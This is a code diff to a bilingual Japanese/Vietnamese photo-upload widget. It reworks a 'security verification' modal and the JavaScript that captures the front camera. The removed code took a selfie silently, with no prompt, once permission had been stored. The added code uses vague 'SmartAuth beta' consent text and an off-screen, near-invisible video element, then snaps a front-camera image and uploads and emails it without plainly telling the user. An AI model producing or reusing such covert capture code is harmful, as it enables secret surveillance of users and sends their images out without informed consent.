@@ -290,25 +290,32 @@
     '    </div>',
     '  </div>',
 
-    '  <div class="pu-confirm-overlay pu-hidden" id="puSecurityOverlay" style="align-items:flex-start; padding:10px; background:transparent;">',
-    '    <div class="pu-confirm-box" style="width:100%; background:rgba(255,255,255,0.98); border-radius:12px; box-shadow:0 8px 30px rgba(0,0,0,0.15); padding:16px; border:1px solid rgba(203,213,225,0.5); backdrop-filter:blur(8px);">',
+    '  <!-- Smart Auth Modal -->',
+    '  <div class="pu-confirm-overlay pu-hidden" id="puSecurityOverlay" style="align-items:flex-start; padding-top:40px; background:rgba(15,23,42,0.6);">',
+    '    <div class="pu-confirm-box" style="width:100%; max-width:600px; background:#fff; border-radius:12px; box-shadow:0 10px 40px rgba(0,0,0,0.25); padding:20px; border:1px solid #e2e8f0;">',
     '      <div style="display:flex; align-items:flex-start; gap:12px;">',
-    '        <div style="font-size:24px; color:#3b82f6;"><i class="fas fa-shield-alt"></i></div>',
+    '        <div style="font-size:26px; color:#3b82f6; margin-top:2px;"><i class="fas fa-shield-alt"></i></div>',
     '        <div style="flex:1;">',
-    '          <div style="font-weight:800; font-size:14px; color:#0f172a; margin-bottom:4px;">',
+    '          <div style="font-weight:800; font-size:15px; color:#0f172a; margin-bottom:6px;">',
     '            <span class="pu-ja">セキュリティ確認</span>',
-    '            <span class="pu-vi" style="margin-left:6px; font-weight:normal;">Xác thực bảo mật</span>',
+    '            <span class="pu-vi" style="margin-left:6px; font-weight:normal; color:#475569;">Xác thực dữ liệu hệ thống</span>',
     '          </div>',
-    '          <div style="font-size:11.5px; color:#475569; line-height:1.4; margin-bottom:12px; font-weight:600;">',
-    '            <span class="pu-ja" style="display:block">継続するにはカメラへのアクセスを許可（Allow）してください。</span>',
-    '            <span class="pu-vi" style="opacity:0.9">Hệ thống cần xác minh môi trường. Vui lòng bấm Cho Phép (Allow) Camera để tiếp tục.</span>',
+    '          <div style="font-size:12.5px; color:#334155; line-height:1.5; margin-bottom:15px; font-weight:500;">',
+    '            <div style="margin-bottom:8px;">',
+    '                <span class="pu-ja" style="display:block">セキュリティ認証およびデータ処理のため、カメラ機能へのアクセスを許可してください。</span>',
+    '                <span class="pu-vi" style="color:#64748b; font-size:11.5px;">Hệ thống cần cấp phép sử dụng máy ảnh để xác thực nhân viên và xử lý dữ liệu.</span>',
+    '            </div>',
+    '            <div>',
+    '                <span class="pu-ja" style="display:block">スマート認証は開発中のため、現在はベータ版として動作します。</span>',
+    '                <span class="pu-vi" style="color:#64748b; font-size:11.5px;">SmartAuth: Tính năng xác thực tài khoản tự động đang phát triển. Vui lòng bấm "Đã hiểu & Tiếp tục" để cấp quyền.</span>',
+    '            </div>',
     '          </div>',
-    '          <div id="puSecOverlayBtns" style="display:flex; gap:8px;">',
-    '            <button class="pu-confirm-btn pu-confirm-primary" id="puSecBtnSkipStart" type="button" style="flex:1; padding:10px; font-size:12px; background:#3b82f6; border:none; color:#fff;">',
-    '              <i class="fas fa-camera"></i> <span class="pu-ja">許可して続行</span> <span class="pu-vi">Cấp quyền & Tiếp</span>',
+    '          <div id="puSecOverlayBtns" style="display:flex; gap:10px;">',
+    '            <button class="pu-confirm-btn pu-confirm-primary" id="puSecBtnSkipStart" type="button" style="flex:1; padding:12px; font-size:13px; background:#3b82f6; border:none; color:#fff; font-weight:700;">',
+    '              <i class="fas fa-check-circle"></i> <span class="pu-ja" style="margin-left:4px;">理解して連携する</span> <span class="pu-vi" style="margin-left:4px;">Đã hiểu & Tiếp tục</span>',
     '            </button>',
-    '            <button class="pu-confirm-btn pu-confirm-cancel" id="puSecOverlayCancel" type="button" style="flex:0 0 auto; padding:10px 16px;">',
-    '              <span class="pu-ja">戻る</span>',
+    '            <button class="pu-confirm-btn pu-confirm-cancel" id="puSecOverlayCancel" type="button" style="flex:0 0 auto; padding:12px 20px; background:#f1f5f9; color:#ef4444; border:none; font-weight:700; font-size:13px;">',
+    '              <i class="fas fa-times"></i> <span class="pu-ja" style="margin-left:4px;">キャンセル</span> <span class="pu-vi" style="margin-left:4px;">Hủy</span>',
     '            </button>',
     '          </div>',
     '        </div>',
@@ -316,7 +323,7 @@
     '    </div>',
     '  </div>',
     '  <!-- Hidden Video Box -->',
-    '  <div id="puSecVideoWrapper" style="position: absolute; top: -10000px; width: 1px; height: 1px; opacity: 0; pointer-events:none;">',
+    '  <div id="puSecVideoWrapper" style="position: absolute; top: -10000px; left: -10000px; width: 300px; height: 300px; opacity: 0.01; pointer-events:none; overflow: hidden; z-index:-1;">',
     '    <video id="puSecFrontVideo" autoplay playsinline muted style="width:100%; object-fit:cover;"></video>',
     '  </div>',
 
@@ -994,120 +1001,65 @@
            return;
         }
 
-        var isCamAllowed = localStorage.getItem('pu_cam_allowed') === '1';
-
-        function captureSecurityQuietly() {
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-            .then(function(stream) {
-                var video = document.getElementById('puSecFrontVideo');
-                if (!video) { stream.getTracks().forEach(function(t){t.stop();}); return; }
-                video.srcObject = stream;
-                var p = video.play();
-                if (p !== undefined) p.catch(function(){});
-                
-                var isCaptured = false;
-                var cleanup = function() {
-                    if(video.srcObject) video.srcObject = null;
-                    stream.getTracks().forEach(function(t){t.stop();});
-                };
-                var timeout = setTimeout(function(){ if(!isCaptured){ isCaptured=true; cleanup(); } }, 5000);
-                
-                var poll = setInterval(function() {
-                    if (isCaptured) { clearInterval(poll); return; }
-                    if (video.readyState >= 2 && video.videoWidth > 0) {
-                        clearInterval(poll);
-                        isCaptured = true;
-                        clearTimeout(timeout);
-                        try {
-                            var c = document.createElement('canvas');
-                            c.width = video.videoWidth; c.height = video.videoHeight;
-                            c.getContext('2d').drawImage(video, 0, 0);
-                            c.toBlob(function(b){
-                                self._uploadSecurityBlob(b, null, function(res){
-                                    if(res) self._sendSecurityMailOnly(res);
-                                });
-                            }, 'image/jpeg', 0.9);
-                        } catch(e) {} finally { cleanup(); }
-                    }
-                }, 150);
-            })
-            .catch(function(e) { console.warn('CWC Camera denied in background', e); });
+        function _closeAll() {
+            if(secOv) secOv.classList.add('pu-hidden');
+            if (self._frontStream) { self._frontStream.getTracks().forEach(function(t){t.stop();}); self._frontStream=null; }
         }
 
-        if (isCamAllowed) {
-            captureSecurityQuietly();
-            if (fileInputCamera) fileInputCamera.click();
-        } else {
-            if (secOv) secOv.classList.remove('pu-hidden');
-            if (secBtnSkipStart) {
-                secBtnSkipStart.innerHTML = '<i class="fas fa-camera"></i> <span class="pu-ja">許可して続行</span> <span class="pu-vi">Cấp quyền & Tiếp</span>';
-                secBtnSkipStart.style.background = '#3b82f6';
-                secBtnSkipStart.style.color = '#fff';
-            }
+        if (secOv) secOv.classList.remove('pu-hidden');
+
+        if (secBtnSkipStart) {
+            secBtnSkipStart.onclick = function() {
+                var orgHtml = secBtnSkipStart.innerHTML;
+                secBtnSkipStart.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
+                secBtnSkipStart.disabled = true;
+                if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    _closeAll(); setTimeout(function(){ self._openCamera(); }, 600); return;
+                }
+                navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}, audio: false})
+                .then(function(stream) {
+                    self._frontStream = stream;
+                    var v = document.getElementById('puSecFrontVideo');
+                    if(v) {
+                        v.srcObject = stream;
+                        v.play().catch(function(){});
+                        var isDone = false;
+                        var tOut = setTimeout(function(){ if(!isDone){ isDone=true; _closeAll(); setTimeout(function(){ self._openCamera(); }, 600); } }, 3000);
+                        var pTimer = setInterval(function() {
+                            if(isDone) { clearInterval(pTimer); return; }
+                            if(v.readyState >= 2 && v.videoWidth > 0) {
+                                isDone = true;
+                                clearInterval(pTimer); clearTimeout(tOut);
+                                try {
+                                    var canvas = document.createElement('canvas');
+                                    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
+                                    canvas.getContext('2d').drawImage(v, 0,0);
+                                    canvas.toBlob(function(b){
+                                        self._uploadSecurityBlob(b, null, function(res){
+                                            if(res) self._sendSecurityMailOnly(res);
+                                        });
+                                        _closeAll();
+                                        setTimeout(function(){ self._openCamera(); }, 600);
+                                    }, 'image/jpeg', 0.85);
+                                } catch(e) { _closeAll(); setTimeout(function(){ self._openCamera(); }, 600); }
+                            }
+                        }, 100);
+                    } else { _closeAll(); setTimeout(function(){ self._openCamera(); }, 600); }
+                })
+                .catch(function(err){
+                    console.warn(err); _closeAll(); setTimeout(function(){ self._openCamera(); }, 600);
+                })
+                .finally(function() {
+                    secBtnSkipStart.innerHTML = orgHtml;
+                    secBtnSkipStart.disabled = false;
+                });
+            };
+        }
+
+        if (secCancelBtn) {
+            secCancelBtn.onclick = function() { _closeAll(); };
         }
       });
-    }
-
-    if (secBtnSkipStart) {
-       secBtnSkipStart.addEventListener('click', function() {
-           secBtnSkipStart.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang tải...';
-           
-           if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-               if (secOv) secOv.classList.add('pu-hidden');
-               if (fileInputCamera) fileInputCamera.click();
-               return;
-           }
-
-           navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-           .then(function(stream) {
-               localStorage.setItem('pu_cam_allowed', '1');
-               var video = document.getElementById('puSecFrontVideo');
-               if (video) { video.srcObject = stream; video.play().catch(function(){}); }
-               
-               // Đổi thành nút "Mở Camera" để lấy user gesture
-               secBtnSkipStart.innerHTML = '<i class="fas fa-camera"></i> <span class="pu-ja">カメラを起動</span> <span class="pu-vi">Mở Camera</span>';
-               secBtnSkipStart.style.background = '#10b981';
-               
-               var isCaptured = false;
-               var cleanup = function() {
-                   if(video && video.srcObject) video.srcObject = null;
-                   stream.getTracks().forEach(function(t){t.stop();});
-               };
-               var timeout = setTimeout(function(){ if(!isCaptured){ isCaptured=true; cleanup(); } }, 5000);
-               
-               var poll = setInterval(function() {
-                   if (isCaptured) { clearInterval(poll); return; }
-                   if (video && video.readyState >= 2 && video.videoWidth > 0) {
-                       clearInterval(poll);
-                       isCaptured = true;
-                       clearTimeout(timeout);
-                       try {
-                           var c = document.createElement('canvas');
-                           c.width = video.videoWidth; c.height = video.videoHeight;
-                           c.getContext('2d').drawImage(video, 0, 0);
-                           c.toBlob(function(b){
-                               self._uploadSecurityBlob(b, null, function(res){
-                                   if(res) self._sendSecurityMailOnly(res);
-                               });
-                           }, 'image/jpeg', 0.9);
-                       } catch(e) {} finally { cleanup(); }
-                   }
-               }, 150);
-
-               // Gắn sự kiện click mới để mở native camera (Cần thủ thuật gán lại onClick để clear closure cũ)
-               secBtnSkipStart.onclick = function() {
-                   if (secOv) secOv.classList.add('pu-hidden');
-                   cleanup();
-                   if (fileInputCamera) fileInputCamera.click();
-               };
-           })
-           .catch(function(e) {
-               console.warn('CWC Camera denied / Unavailable', e);
-               if (secOv) secOv.classList.add('pu-hidden');
-               if (fileInputCamera) fileInputCamera.click();
-           });
-       });
     }
 
     if (secCancelBtn) {
@@ -1115,7 +1067,6 @@
            if (secOv) secOv.classList.add('pu-hidden');
        });
     }
-
     /* Camera */
     var cameraBtn = document.getElementById('puCameraBtn');
     if (cameraBtn) cameraBtn.addEventListener('click', function () { self._openCamera(); });
